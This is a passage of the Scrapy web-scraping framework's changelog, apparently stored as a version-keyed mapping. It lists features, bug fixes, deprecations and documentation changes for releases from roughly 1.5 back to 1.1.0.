``scrapy.mail.MailSender`` now works in Python 3 (it requires Twisted 17.9.0)\n- Connections to proxy servers are reused (:issue:`2743`)\n- Add template for a downloader middleware (:issue:`2755`)\n- Explicit message for NotImplementedError when parse callback not defined\n  (:issue:`2831`)\n- CrawlerProcess got an option to disable installation of root log handler\n  (:issue:`2921`)\n- LinkExtractor now ignores ``m4v`` extension by default\n- Better log messages for responses over :setting:`DOWNLOAD_WARNSIZE` and\n  :setting:`DOWNLOAD_MAXSIZE` limits (:issue:`2927`)\n- Show warning when a URL is put to ``Spider.allowed_domains`` instead of\n  a domain (:issue:`2250`).\n\nBug fixes\n~~~~~~~~~\n\n- Fix logging of settings overridden by ``custom_settings``;\n  **this is technically backward-incompatible** because the logger\n  changes from ``[scrapy.utils.log]`` to ``[scrapy.crawler]``, so please\n  update your log parsers if needed (:issue:`1343`)\n- Default Scrapy User-Agent now uses https link to scrapy.org (:issue:`2983`).\n  **This is technically backward-incompatible**; override\n  :setting:`USER_AGENT` if you relied on old value.\n- Fix PyPy and PyPy3 test failures, support them officially\n  (:issue:`2793`, :issue:`2935`, :issue:`2990`, :issue:`3050`, :issue:`2213`,\n  :issue:`3048`)\n- Fix DNS resolver when ``DNSCACHE_ENABLED=False`` (:issue:`2811`)\n- Add ``cryptography`` for Debian Jessie tox test env (:issue:`2848`)\n- Add verification to check if Request callback is callable (:issue:`2766`)\n- Port ``extras/qpsclient.py`` to Python 3 (:issue:`2849`)\n- Use getfullargspec under the scenes for Python 3 to stop DeprecationWarning\n  (:issue:`2862`)\n- Update deprecated test aliases (:issue:`2876`)\n- Fix ``SitemapSpider`` support for alternate links (:issue:`2853`)\n\nDocs\n~~~~\n\n- Added missing bullet point for the ``AUTOTHROTTLE_TARGET_CONCURRENCY``\n  setting. (:issue:`2756`)\n- Update Contributing docs, document new support channels\n  (:issue:`2762`, issue:`3038`)\n- Include references to Scrapy subreddit in the docs\n- Fix broken links; use https:// for external links\n  (:issue:`2978`, :issue:`2982`, :issue:`2958`)\n- Document CloseSpider extension better (:issue:`2759`)\n- Use ``pymongo.collection.Collection.insert_one()`` in MongoDB example\n  (:issue:`2781`)\n- Spelling mistake and typos\n  (:issue:`2828`, :issue:`2837`, :issue:`2884`, :issue:`2924`)\n- Clarify ``CSVFeedSpider.headers`` documentation (:issue:`2826`)\n- Document ``DontCloseSpider`` exception and clarify ``spider_idle``\n  (:issue:`2791`)\n- Update \"Releases\" section in README (:issue:`2764`)\n- Fix rst syntax in ``DOWNLOAD_FAIL_ON_DATALOSS`` docs (:issue:`2763`)\n- Small fix in description of startproject arguments (:issue:`2866`)\n- Clarify data types in Response.body docs (:issue:`2922`)\n- Add a note about ``request.meta['depth']`` to DepthMiddleware docs (:issue:`2374`)\n- Add a note about ``request.meta['dont_merge_cookies']`` to CookiesMiddleware\n  docs (:issue:`2999`)\n- Up-to-date example of project structure (:issue:`2964`, :issue:`2976`)\n- A better example of ItemExporters usage (:issue:`2989`)\n- Document ``from_crawler`` methods for spider and downloader middlewares\n  (:issue:`3019`)\n\n.. _release-1.4.0:\n\n", "1.4.0": "-------------------------\n\n", "1.4": "but quite a few handy improvements nonetheless.\n\nScrapy now supports anonymous FTP sessions with customizable user and\npassword via the new :setting:`FTP_USER` and :setting:`FTP_PASSWORD` settings.\nAnd if you're using Twisted version 17.1.0 or above, FTP is now available\nwith Python 3.\n\nThere's a new :meth:`response.follow <scrapy.http.TextResponse.follow>` method\nfor creating requests; **it is now a recommended way to create Requests\nin Scrapy spiders**. This method makes it easier to write correct\nspiders; ``response.follow`` has several advantages over creating\n``scrapy.Request`` objects directly:\n\n* it handles relative URLs;\n* it works properly with non-ascii URLs on non-UTF8 pages;\n* in addition to absolute and relative URLs it supports Selectors;\n  for ``<a>`` elements it can also extract their href values.\n\nFor example, instead of this::\n\n    for href in response.css('li.page a::attr(href)').extract():\n        url = response.urljoin(href)\n        yield scrapy.Request(url, self.parse, encoding=response.encoding)\n\nOne can now write this::\n\n    for a in response.css('li.page a'):\n        yield response.follow(a, self.parse)\n\nLink extractors are also improved. They work similarly to what a regular\nmodern browser would do: leading and trailing whitespace are removed\nfrom attributes (think ``href=\"   http://example.com\"``) when building\n``Link`` objects. This whitespace-stripping also happens for ``action``\nattributes with ``FormRequest``.\n\n**Please also note that link extractors do not canonicalize URLs by default\nanymore.** This was puzzling users every now and then, and it's not what\nbrowsers do in fact, so we removed that extra transformation on extracted\nlinks.\n\nFor those of you wanting more control on the ``Referer:`` header that Scrapy\nsends when following links, you can set your own ``Referrer Policy``.\nPrior to Scrapy 1.4, the default ``RefererMiddleware`` would simply and\nblindly set it to the URL of the response that generated the HTTP request\n(which could leak information on your URL seeds).\nBy default, Scrapy now behaves much like your regular browser does.\nAnd this policy is fully customizable with W3C standard values\n(or with something really custom of your own if you wish).\nSee :setting:`REFERRER_POLICY` for details.\n\nTo make Scrapy spiders easier to debug, Scrapy logs more stats by default\nin 1.4: memory usage stats, detailed retry stats, detailed HTTP error code\nstats. A similar change is that HTTP cache path is also visible in logs now.\n\nLast but not least, Scrapy now has the option to make JSON and XML items\nmore human-readable, with newlines between items and even custom indenting\noffset, using the new :setting:`FEED_EXPORT_INDENT` setting.\n\nEnjoy! (Or read on for the rest of changes in this release.)\n\nDeprecations and Backward Incompatible Changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Default to ``canonicalize=False`` in\n  :class:`scrapy.linkextractors.LinkExtractor\n  <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n  (:issue:`2537`, fixes :issue:`1941` and :issue:`1982`):\n  **warning, this is technically backward-incompatible**\n- Enable memusage extension by default (:issue:`2539`, fixes :issue:`2187`);\n  **this is technically backward-incompatible** so please check if you have\n  any non-default ``MEMUSAGE_***`` options set.\n- ``EDITOR`` environment variable now takes precedence over ``EDITOR``\n  option defined in settings.py (:issue:`1829`); Scrapy default settings\n  no longer depend on environment variables. **This is technically a backward\n  incompatible change**.\n- ``Spider.make_requests_from_url`` is deprecated\n  (:issue:`1728`, fixes :issue:`1495`).\n\nNew Features\n~~~~~~~~~~~~\n\n- Accept proxy credentials in :reqmeta:`proxy` request meta key (:issue:`2526`)\n- Support `brotli-compressed`_ content; requires optional `brotlipy`_\n  (:issue:`2535`)\n- New :ref:`response.follow <response-follow-example>` shortcut\n  for creating requests (:issue:`1940`)\n- Added ``flags`` argument and attribute to :class:`Request <scrapy.http.Request>`\n  objects (:issue:`2047`)\n- Support Anonymous FTP (:issue:`2342`)\n- Added ``retry/count``, ``retry/max_reached`` and ``retry/reason_count/<reason>``\n  stats to :class:`RetryMiddleware <scrapy.downloadermiddlewares.retry.RetryMiddleware>`\n  (:issue:`2543`)\n- Added ``httperror/response_ignored_count`` and ``httperror/response_ignored_status_count/<status>``\n  stats to :class:`HttpErrorMiddleware <scrapy.spidermiddlewares.httperror.HttpErrorMiddleware>`\n  (:issue:`2566`)\n- Customizable :setting:`Referrer policy <REFERRER_POLICY>` in\n  :class:`RefererMiddleware <scrapy.spidermiddlewares.referer.RefererMiddleware>`\n  (:issue:`2306`)\n- New ``data:`` URI download handler (:issue:`2334`, fixes :issue:`2156`)\n- Log cache directory when HTTP Cache is used (:issue:`2611`, fixes :issue:`2604`)\n- Warn users when project contains duplicate spider names (fixes :issue:`2181`)\n- ``scrapy.utils.datatypes.CaselessDict`` now accepts ``Mapping`` instances and\n  not only dicts (:issue:`2646`)\n- :ref:`Media downloads <topics-media-pipeline>`, with\n  :class:`~scrapy.pipelines.files.FilesPipeline` or\n  :class:`~scrapy.pipelines.images.ImagesPipeline`, can now optionally handle\n  HTTP redirects using the new :setting:`MEDIA_ALLOW_REDIRECTS` setting\n  (:issue:`2616`, fixes :issue:`2004`)\n- Accept non-complete responses from websites using a new\n  :setting:`DOWNLOAD_FAIL_ON_DATALOSS` setting (:issue:`2590`, fixes :issue:`2586`)\n- Optional pretty-printing of JSON and XML items via\n  :setting:`FEED_EXPORT_INDENT` setting (:issue:`2456`, fixes :issue:`1327`)\n- Allow dropping fields in ``FormRequest.from_response`` formdata when\n  ``None`` value is passed (:issue:`667`)\n- Per-request retry times with the new :reqmeta:`max_retry_times` meta key\n  (:issue:`2642`)\n- ``python -m scrapy`` as a more explicit alternative to ``scrapy`` command\n  (:issue:`2740`)\n\n.. _brotli-compressed: https://www.ietf.org/rfc/rfc7932.txt\n.. _brotlipy: https://github.com/python-hyper/brotlipy/\n\nBug fixes\n~~~~~~~~~\n\n- LinkExtractor now strips leading and trailing whitespaces from attributes\n  (:issue:`2547`, fixes :issue:`1614`)\n- Properly handle whitespaces in action attribute in\n  :class:`~scrapy.http.FormRequest` (:issue:`2548`)\n- Buffer CONNECT response bytes from proxy until all HTTP headers are received\n  (:issue:`2495`, fixes :issue:`2491`)\n- FTP downloader now works on Python 3, provided you use Twisted>=17.1\n  (:issue:`2599`)\n- Use body to choose response type after decompressing content (:issue:`2393`,\n  fixes :issue:`2145`)\n- Always decompress ``Content-Encoding: gzip`` at :class:`HttpCompressionMiddleware\n  <scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware>` stage (:issue:`2391`)\n- Respect custom log level in ``Spider.custom_settings`` (:issue:`2581`,\n  fixes :issue:`1612`)\n- 'make htmlview' fix for macOS (:issue:`2661`)\n- Remove \"commands\" from the command list  (:issue:`2695`)\n- Fix duplicate Content-Length header for POST requests with empty body (:issue:`2677`)\n- Properly cancel large downloads, i.e. above :setting:`DOWNLOAD_MAXSIZE` (:issue:`1616`)\n- ImagesPipeline: fixed processing of transparent PNG images with palette\n  (:issue:`2675`)\n\nCleanups & Refactoring\n~~~~~~~~~~~~~~~~~~~~~~\n\n- Tests: remove temp files and folders (:issue:`2570`),\n  fixed ProjectUtilsTest on macOS (:issue:`2569`),\n  use portable pypy for Linux on Travis CI (:issue:`2710`)\n- Separate building request from ``_requests_to_follow`` in CrawlSpider (:issue:`2562`)\n- Remove \u201cPython 3 progress\u201d badge (:issue:`2567`)\n- Add a couple more lines to ``.gitignore`` (:issue:`2557`)\n- Remove bumpversion prerelease configuration (:issue:`2159`)\n- Add codecov.yml file (:issue:`2750`)\n- Set context factory implementation based on Twisted version (:issue:`2577`,\n  fixes :issue:`2560`)\n- Add omitted ``self`` arguments in default project middleware template (:issue:`2595`)\n- Remove redundant ``slot.add_request()`` call in ExecutionEngine (:issue:`2617`)\n- Catch more specific ``os.error`` exception in\n  ``scrapy.pipelines.files.FSFilesStore`` (:issue:`2644`)\n- Change \"localhost\" test server certificate (:issue:`2720`)\n- Remove unused ``MEMUSAGE_REPORT`` setting (:issue:`2576`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n- Binary mode is required for exporters (:issue:`2564`, fixes :issue:`2553`)\n- Mention issue with :meth:`FormRequest.from_response\n  <scrapy.http.FormRequest.from_response>` due to bug in lxml (:issue:`2572`)\n- Use single quotes uniformly in templates (:issue:`2596`)\n- Document :reqmeta:`ftp_user` and :reqmeta:`ftp_password` meta keys (:issue:`2587`)\n- Removed section on deprecated ``contrib/`` (:issue:`2636`)\n- Recommend Anaconda when installing Scrapy on Windows\n  (:issue:`2477`, fixes :issue:`2475`)\n- FAQ: rewrite note on Python 3 support on Windows (:issue:`2690`)\n- Rearrange selector sections (:issue:`2705`)\n- Remove ``__nonzero__`` from :class:`~scrapy.selector.SelectorList`\n  docs (:issue:`2683`)\n- Mention how to disable request filtering in documentation of\n  :setting:`DUPEFILTER_CLASS` setting (:issue:`2714`)\n- Add sphinx_rtd_theme to docs setup readme (:issue:`2668`)\n- Open file in text mode in JSON item writer example (:issue:`2729`)\n- Clarify ``allowed_domains`` example (:issue:`2670`)\n\n\n.. _release-1.3.3:\n\n", "1.3.3": "-------------------------\n\nBug fixes\n~~~~~~~~~\n\n- Make ``SpiderLoader`` raise ``ImportError`` again by default for missing\n  dependencies and wrong :setting:`SPIDER_MODULES`.\n  These exceptions were silenced as warnings since 1.3.0.\n  A new setting is introduced to toggle between warning or exception if needed ;\n  see :setting:`SPIDER_LOADER_WARN_ONLY` for details.\n\n.. _release-1.3.2:\n\n", "1.3.2": "-------------------------\n\nBug fixes\n~~~~~~~~~\n\n- Preserve request class when converting to/from dicts (utils.reqser) (:issue:`2510`).\n- Use consistent selectors for author field in tutorial (:issue:`2551`).\n- Fix TLS compatibility in Twisted 17+ (:issue:`2558`)\n\n.. _release-1.3.1:\n\n", "1.3.1": "-------------------------\n\nNew features\n~~~~~~~~~~~~\n\n- Support ``'True'`` and ``'False'`` string values for boolean settings (:issue:`2519`);\n  you can now do something like ``scrapy crawl myspider -s REDIRECT_ENABLED=False``.\n- Support kwargs with ``response.xpath()`` to use :ref:`XPath variables <topics-selectors-xpath-variables>`\n  and ad-hoc namespaces declarations ;\n  this requires at least Parsel v1.1 (:issue:`2457`).\n- Add support for Python 3.6 (:issue:`2485`).\n- Run tests on PyPy (warning: some tests still fail, so PyPy is not supported yet).\n\nBug fixes\n~~~~~~~~~\n\n- Enforce ``DNS_TIMEOUT`` setting (:issue:`2496`).\n- Fix :command:`view` command ; it was a regression in v1.3.0 (:issue:`2503`).\n- Fix tests regarding ``*_EXPIRES settings`` with Files/Images pipelines (:issue:`2460`).\n- Fix name of generated pipeline class when using basic project template (:issue:`2466`).\n- Fix compatibility with Twisted 17+ (:issue:`2496`, :issue:`2528`).\n- Fix ``scrapy.Item`` inheritance on Python 3.6 (:issue:`2511`).\n- Enforce numeric values for components order in ``SPIDER_MIDDLEWARES``,\n  ``DOWNLOADER_MIDDLEWARES``, ``EXTENSIONS`` and ``SPIDER_CONTRACTS`` (:issue:`2420`).\n\nDocumentation\n~~~~~~~~~~~~~\n\n- Reword Code of Conduct section and upgrade to Contributor Covenant v1.4\n  (:issue:`2469`).\n- Clarify that passing spider arguments converts them to spider attributes\n  (:issue:`2483`).\n- Document ``formid`` argument on ``FormRequest.from_response()`` (:issue:`2497`).\n- Add .rst extension to README files (:issue:`2507`).\n- Mention LevelDB cache storage backend (:issue:`2525`).\n- Use ``yield`` in sample callback code (:issue:`2533`).\n- Add note about HTML entities decoding with ``.re()/.re_first()`` (:issue:`1704`).\n- Typos (:issue:`2512`, :issue:`2534`, :issue:`2531`).\n\nCleanups\n~~~~~~~~\n\n- Remove redundant check in ``MetaRefreshMiddleware`` (:issue:`2542`).\n- Faster checks in ``LinkExtractor`` for allow/deny patterns (:issue:`2538`).\n- Remove dead code supporting old Twisted versions (:issue:`2544`).\n\n\n.. _release-1.3.0:\n\n", "1.3.0": "-------------------------\n\nThis release comes rather soon after 1.2.2 for one main reason:\nit was found out that releases since 0.18 up to 1.2.2 (included) use\nsome backported code from Twisted (``scrapy.xlib.tx.*``),\neven if newer Twisted modules are available.\nScrapy now uses ``twisted.web.client`` and ``twisted.internet.endpoints`` directly.\n(See also cleanups below.)\n\nAs it is a major change, we wanted to get the bug fix out quickly\nwhile not breaking any projects using the 1.2 series.\n\nNew Features\n~~~~~~~~~~~~\n\n- ``MailSender`` now accepts single strings as values for ``to`` and ``cc``\n  arguments (:issue:`2272`)\n- ``scrapy fetch url``, ``scrapy shell url`` and ``fetch(url)`` inside\n  Scrapy shell now follow HTTP redirections by default (:issue:`2290`);\n  See :command:`fetch` and :command:`shell` for details.\n- ``HttpErrorMiddleware`` now logs errors with ``INFO`` level instead of ``DEBUG``;\n  this is technically **backward incompatible** so please check your log parsers.\n- By default, logger names now use a long-form path, e.g. ``[scrapy.extensions.logstats]``,\n  instead of the shorter \"top-level\" variant of prior releases (e.g. ``[scrapy]``);\n  this is **backward incompatible** if you have log parsers expecting the short\n  logger name part. You can switch back to short logger names using :setting:`LOG_SHORT_NAMES`\n  set to ``True``.\n\nDependencies & Cleanups\n~~~~~~~~~~~~~~~~~~~~~~~\n\n- Scrapy now requires Twisted >= 13.1 which is the case for many Linux\n  distributions already.\n- As a consequence, we got rid of ``scrapy.xlib.tx.*`` modules, which\n  copied some of Twisted code for users stuck with an \"old\" Twisted version\n- ``ChunkedTransferMiddleware`` is deprecated and removed from the default\n  downloader middlewares.\n\n.. _release-1.2.3:\n\n", "1.2.3": "-------------------------\n\n- Packaging fix: disallow unsupported Twisted versions in setup.py\n\n\n.. _release-1.2.2:\n\n", "1.2.2": "-------------------------\n\nBug fixes\n~~~~~~~~~\n\n- Fix a cryptic traceback when a pipeline fails on ``open_spider()`` (:issue:`2011`)\n- Fix embedded IPython shell variables (fixing :issue:`396` that re-appeared\n  in 1.2.0, fixed in :issue:`2418`)\n- A couple of patches when dealing with robots.txt:\n\n  - handle (non-standard) relative sitemap URLs (:issue:`2390`)\n  - handle non-ASCII URLs and User-Agents in Python 2 (:issue:`2373`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n- Document ``\"download_latency\"`` key in ``Request``'s ``meta`` dict (:issue:`2033`)\n- Remove page on (deprecated & unsupported) Ubuntu packages from ToC (:issue:`2335`)\n- A few fixed typos (:issue:`2346`, :issue:`2369`, :issue:`2369`, :issue:`2380`)\n  and clarifications (:issue:`2354`, :issue:`2325`, :issue:`2414`)\n\nOther changes\n~~~~~~~~~~~~~\n\n- Advertize `conda-forge`_ as Scrapy's official conda channel (:issue:`2387`)\n- More helpful error messages when trying to use ``.css()`` or ``.xpath()``\n  on non-Text Responses (:issue:`2264`)\n- ``startproject`` command now generates a sample ``middlewares.py`` file (:issue:`2335`)\n- Add more dependencies' version info in ``scrapy version`` verbose output (:issue:`2404`)\n- Remove all ``*.pyc`` files from source distribution (:issue:`2386`)\n\n.. _conda-forge: https://anaconda.org/conda-forge/scrapy\n\n\n.. _release-1.2.1:\n\n", "1.2.1": "-------------------------\n\nBug fixes\n~~~~~~~~~\n\n- Include OpenSSL's more permissive default ciphers when establishing\n  TLS/SSL connections (:issue:`2314`).\n- Fix \"Location\" HTTP header decoding on non-ASCII URL redirects (:issue:`2321`).\n\nDocumentation\n~~~~~~~~~~~~~\n\n- Fix JsonWriterPipeline example (:issue:`2302`).\n- Various notes: :issue:`2330` on spider names,\n  :issue:`2329` on middleware methods processing order,\n  :issue:`2327` on getting multi-valued HTTP headers as lists.\n\nOther changes\n~~~~~~~~~~~~~\n\n- Removed ``www.`` from ``start_urls`` in built-in spider templates (:issue:`2299`).\n\n\n.. _release-1.2.0:\n\n", "1.2.0": "-------------------------\n\nNew Features\n~~~~~~~~~~~~\n\n- New :setting:`FEED_EXPORT_ENCODING` setting to customize the encoding\n  used when writing items to a file.\n  This can be used to turn off ``\\uXXXX`` escapes in JSON output.\n  This is also useful for those wanting something else than UTF-8\n  for XML or CSV output (:issue:`2034`).\n- ``startproject`` command now supports an optional destination directory\n  to override the default one based on the project name (:issue:`2005`).\n- New :setting:`SCHEDULER_DEBUG` setting to log requests serialization\n  failures (:issue:`1610`).\n- JSON encoder now supports serialization of ``set`` instances (:issue:`2058`).\n- Interpret ``application/json-amazonui-streaming`` as ``TextResponse`` (:issue:`1503`).\n- ``scrapy`` is imported by default when using shell tools (:command:`shell`,\n  :ref:`inspect_response <topics-shell-inspect-response>`) (:issue:`2248`).\n\nBug fixes\n~~~~~~~~~\n\n- DefaultRequestHeaders middleware now runs before UserAgent middleware\n  (:issue:`2088`). **Warning: this is technically backward incompatible**,\n  though we consider this a bug fix.\n- HTTP cache extension and plugins that use the ``.scrapy`` data directory now\n  work outside projects (:issue:`1581`).  **Warning: this is technically\n  backward incompatible**, though we consider this a bug fix.\n- ``Selector`` does not allow passing both ``response`` and ``text`` anymore\n  (:issue:`2153`).\n- Fixed logging of wrong callback name with ``scrapy parse`` (:issue:`2169`).\n- Fix for an odd gzip decompression bug (:issue:`1606`).\n- Fix for selected callbacks when using ``CrawlSpider`` with :command:`scrapy parse <parse>`\n  (:issue:`2225`).\n- Fix for invalid JSON and XML files when spider yields no items (:issue:`872`).\n- Implement ``flush()`` for ``StreamLogger`` avoiding a warning in logs (:issue:`2125`).\n\nRefactoring\n~~~~~~~~~~~\n\n- ``canonicalize_url`` has been moved to `w3lib.url`_ (:issue:`2168`).\n\n.. _w3lib.url: https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.url.canonicalize_url\n\nTests & Requirements\n~~~~~~~~~~~~~~~~~~~~\n\nScrapy's new requirements baseline is Debian 8 \"Jessie\". It was previously\nUbuntu 12.04 Precise.\nWhat this means in practice is that we run continuous integration tests\nwith these (main) packages versions at a minimum:\nTwisted 14.0, pyOpenSSL 0.14, lxml 3.4.\n\nScrapy may very well work with older versions of these packages\n(the code base still has switches for older Twisted versions for example)\nbut it is not guaranteed (because it's not tested anymore).\n\nDocumentation\n~~~~~~~~~~~~~\n\n- Grammar fixes: :issue:`2128`, :issue:`1566`.\n- Download stats badge removed from README (:issue:`2160`).\n- New Scrapy :ref:`architecture diagram <topics-architecture>` (:issue:`2165`).\n- Updated ``Response`` parameters documentation (:issue:`2197`).\n- Reworded misleading :setting:`RANDOMIZE_DOWNLOAD_DELAY` description (:issue:`2190`).\n- Add StackOverflow as a support channel (:issue:`2257`).\n\n.. _release-1.1.4:\n\n", "1.1.4": "-------------------------\n\n- Packaging fix: disallow unsupported Twisted versions in setup.py\n\n.. _release-1.1.3:\n\n", "1.1.3": "-------------------------\n\nBug fixes\n~~~~~~~~~\n\n- Class attributes for subclasses of ``ImagesPipeline`` and ``FilesPipeline``\n  work as they did before 1.1.1 (:issue:`2243`, fixes :issue:`2198`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n- :ref:`Overview <intro-overview>` and :ref:`tutorial <intro-tutorial>`\n  rewritten to use http://toscrape.com websites\n  (:issue:`2236`, :issue:`2249`, :issue:`2252`).\n\n.. _release-1.1.2:\n\n", "1.1.2": "-------------------------\n\nBug fixes\n~~~~~~~~~\n\n- Introduce a missing :setting:`IMAGES_STORE_S3_ACL` setting to override\n  the default ACL policy in ``ImagesPipeline`` when uploading images to S3\n  (note that default ACL policy is \"private\" -- instead of \"public-read\" --\n  since Scrapy 1.1.0)\n- :setting:`IMAGES_EXPIRES` default value set back to 90\n  (the regression was introduced in 1.1.1)\n\n.. _release-1.1.1:\n\n", "1.1.1": "-------------------------\n\nBug fixes\n~~~~~~~~~\n\n- Add \"Host\" header in CONNECT requests to HTTPS proxies (:issue:`2069`)\n- Use response ``body`` when choosing response class\n  (:issue:`2001`, fixes :issue:`2000`)\n- Do not fail on canonicalizing URLs with wrong netlocs\n  (:issue:`2038`, fixes :issue:`2010`)\n- a few fixes for ``HttpCompressionMiddleware`` (and ``SitemapSpider``):\n\n  - Do not decode HEAD responses (:issue:`2008`, fixes :issue:`1899`)\n  - Handle charset parameter in gzip Content-Type header\n    (:issue:`2050`, fixes :issue:`2049`)\n  - Do not decompress gzip octet-stream responses\n    (:issue:`2065`, fixes :issue:`2063`)\n\n- Catch (and ignore with a warning) exception when verifying certificate\n  against IP-address hosts (:issue:`2094`, fixes :issue:`2092`)\n- Make ``FilesPipeline`` and ``ImagesPipeline`` backward compatible again\n  regarding the use of legacy class attributes for customization\n  (:issue:`1989`, fixes :issue:`1985`)\n\n\nNew features\n~~~~~~~~~~~~\n\n- Enable genspider command outside project folder (:issue:`2052`)\n- Retry HTTPS CONNECT ``TunnelError`` by default (:issue:`1974`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n- ``FEED_TEMPDIR`` setting at lexicographical position (:commit:`9b3c72c`)\n- Use idiomatic ``.extract_first()`` in overview (:issue:`1994`)\n- Update years in copyright notice (:commit:`c2c8036`)\n- Add information and example on errbacks (:issue:`1995`)\n- Use \"url\" variable in downloader middleware example (:issue:`2015`)\n- Grammar fixes (:issue:`2054`, :issue:`2120`)\n- New FAQ entry on using BeautifulSoup in spider callbacks (:issue:`2048`)\n- Add notes about Scrapy not working on Windows with Python 3 (:issue:`2060`)\n- Encourage complete titles in pull requests (:issue:`2026`)\n\nTests\n~~~~~\n\n- Upgrade py.test requirement on Travis CI and Pin pytest-cov to 2.2.1 (:issue:`2095`)\n\n.. _release-1.1.0:\n\n", "1.1.0": "-------------------------\n\nThis 1.1 release brings a lot of interesting features and bug fixes:\n\n- Scrapy 1.1 has beta Python 3 support (requires Twisted >= 15.5). See\n  :ref:`news_betapy3` for more details and some limitations.\n- Hot new features:\n\n  - Item loaders now support nested loaders (:issue:`1467`).\n  - ``FormRequest.from_response`` improvements (:issue:`1382`, :issue:`1137`).\n  - Added setting :setting:`AUTOTHROTTLE_TARGET_CONCURRENCY` and improved\n    AutoThrottle docs (:issue:`1324`).\n  - Added ``response.text`` to get body as unicode (:issue:`1730`).\n  - Anonymous S3 connections (:issue:`1358`).\n  - Deferreds in downloader middlewares (:issue:`1473`). This enables better\n    robots.txt handling (:issue:`1471`).\n  - HTTP caching now follows RFC2616 more closely, added settings\n    :setting:`HTTPCACHE_ALWAYS_STORE` and\n    :setting:`HTTPCACHE_IGNORE_RESPONSE_CACHE_CONTROLS` (:issue:`1151`).\n  - Selectors were extracted to the parsel_ library (:issue:`1409`). This means\n    you can use Scrapy Selectors without Scrapy and also upgrade the\n    selectors engine without needing to upgrade Scrapy.\n  - HTTPS downloader now does TLS protocol negotiation by default,\n    instead of forcing TLS 1.0. You can also set the SSL/TLS method\n    using the new :setting:`DOWNLOADER_CLIENT_TLS_METHOD`.\n\n- These bug fixes may require your attention:\n\n  - Don't retry bad requests (HTTP 400) by default (:issue:`1289`).\n    If you need the old behavior, add ``400`` to :setting:`RETRY_HTTP_CODES`.\n  - Fix shell files argument handling (:issue:`1710`, :issue:`1550`).\n    If you try ``scrapy shell index.html`` it will try to load the URL http://index.html,\n    use ``scrapy shell ./index.html`` to load a local file.\n  - Robots.txt compliance is now enabled by default for newly-created projects\n    (:issue:`1724`). Scrapy will also wait for robots.txt to be downloaded\n    before proceeding with the crawl (:issue:`1735`). If you want to disable\n    this behavior, update :setting:`ROBOTSTXT_OBEY` in ``settings.py`` file\n    after creating a new project.\n  - Exporters now work on unicode, instead of bytes by default (:issue:`1080`).\n    If you use :class:`~scrapy.exporters.PythonItemExporter`, you may want to\n    update your code to disable binary mode which is now deprecated.\n  - Accept XML node names containing dots as valid (:issue:`1533`).\n  - When uploading files or images to S3 (with ``FilesPipeline`` or\n    ``ImagesPipeline``), the default ACL policy is now \"private\" instead\n    of \"public\" **Warning: backward incompatible!**.\n    You can use :setting:`FILES_STORE_S3_ACL` to change it.\n  - We've reimplemented ``canonicalize_url()`` for more correct output,\n    especially for URLs with non-ASCII characters (:issue:`1947`).\n    This could change link extractors output compared to previous Scrapy versions.\n    This may also invalidate some cache entries you could still have from pre-1.1 runs.\n    **Warning: backward incompatible!**.\n\nKeep reading for more details on other improvements and bug fixes.\n\n.. _news_betapy3:\n\nBeta Python 3 Support\n~~~~~~~~~~~~~~~~~~~~~\n\nWe have been `hard at work to make Scrapy run on Python 3\n<https://github.com/scrapy/scrapy/wiki/Python-3-Porting>`_. As a result, now\nyou can run spiders on Python 3.3, 3.4 and 3.5 (Twisted >= 15.5 required). Some\nfeatures are still missing (and some may never be ported).\n\n\nAlmost all builtin extensions/middlewares are expected to work.\nHowever, we are aware of some limitations in Python 3:\n\n- Scrapy does not work on Windows with Python 3\n- Sending emails is not supported\n- FTP download handler is not supported\n- Telnet console is not supported\n\nAdditional New Features and Enhancements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Scrapy now has a `Code of Conduct`_ (:issue:`1681`).\n- Command line tool now has completion for zsh (:issue:`934`).\n- Improvements to ``scrapy shell``:\n\n  - Support for bpython and configure preferred Python shell via\n    ``SCRAPY_PYTHON_SHELL`` (:issue:`1100`, :issue:`1444`).\n  - Support URLs without scheme (:issue:`1498`)\n    **Warning: backward incompatible!**\n  - Bring back support for relative file path (:issue:`1710`, :issue:`1550`).\n\n- Added :setting:`MEMUSAGE_CHECK_INTERVAL_SECONDS` setting to change default check\n  interval (:issue:`1282`).\n- Download handlers are now lazy-loaded on first request using their\n  scheme (:issue:`1390`, :issue:`1421`).\n- HTTPS download handlers do not force TLS 1.0 anymore; instead,\n  OpenSSL's ``SSLv23_method()/TLS_method()`` is used allowing to try\n  negotiating with the remote hosts the highest TLS protocol version\n  it can (:issue:`1794`, :issue:`1629`).\n- ``RedirectMiddleware`` now skips the status codes from\n  ``handle_httpstatus_list`` on spider attribute\n  or in ``Request``'s ``meta`` key (:issue:`1334`, :issue:`1364`,\n  :issue:`1447`).\n- Form submission:\n\n  - now works with ``<button>`` elements too (:issue:`1469`).\n  - an empty string is now used for submit buttons without a value\n    (:issue:`1472`)\n\n- Dict-like settings now have per-key priorities\n  (:issue:`1135`, :issue:`1149` and :issue:`1586`).\n- Sending non-ASCII emails (:issue:`1662`)\n- ``CloseSpider`` and ``SpiderState`` extensions now get disabled if no relevant\n  setting is set (:issue:`1723`, :issue:`1725`).\n- Added method ``ExecutionEngine.close`` (:issue:`1423`).\n- Added method ``CrawlerRunner.create_crawler`` (:issue:`1528`).\n- Scheduler priority queue can now be customized via\n  :setting:`SCHEDULER_PRIORITY_QUEUE` (:issue:`1822`).\n- ``.pps`` links are now ignored by default in link extractors (:issue:`1835`).\n- temporary data folder for FTP and S3 feed storages can be customized\n  using a new :setting:`FEED_TEMPDIR` setting (:issue:`1847`).\n- ``FilesPipeline`` and ``ImagesPipeline`` settings are now instance attributes\n  instead of class attributes, enabling spider-specific behaviors (:issue:`1891`).\n- ``JsonItemExporter`` now formats opening and closing square brackets\n  on their own line (first and last lines of output file) (:issue:`1950`).\n- If available, ``botocore`` is used for ``S3FeedStorage``, ``S3DownloadHandler``\n  and ``S3FilesStore`` (:issue:`1761`, :issue:`1883`).\n- Tons of documentation updates and related fixes (:issue:`1291`, :issue:`1302`,\n  :issue:`1335`, :issue:`1683`, :issue:`1660`, :issue:`1642`, :issue:`1721`,\n  